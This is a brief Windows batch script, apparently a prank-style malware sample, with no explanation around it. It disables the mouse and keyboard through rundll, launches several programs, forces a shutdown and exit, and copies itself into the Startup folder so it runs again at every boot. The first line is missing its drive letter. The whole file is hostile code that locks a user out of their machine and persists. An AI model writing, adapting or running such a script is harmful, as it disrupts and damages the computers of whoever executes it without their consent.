   :\windows\rundll.exe mouse,disable
   c:\windows\rundll.exe keyboard,disable
   start sol.exe
   start mspaint.exe
   start wordpad.exe
   start notepad.exe
   cls
   SHUTDOWN -s -t 2 -c
   TYPE NUL | CHOICE.COM /N/CY/TY,3 >NUL
   copy %0 c:\windows\startm~1\programs\startup
   start rundll.exe shell32.dll,SHExitWindowsEx 2
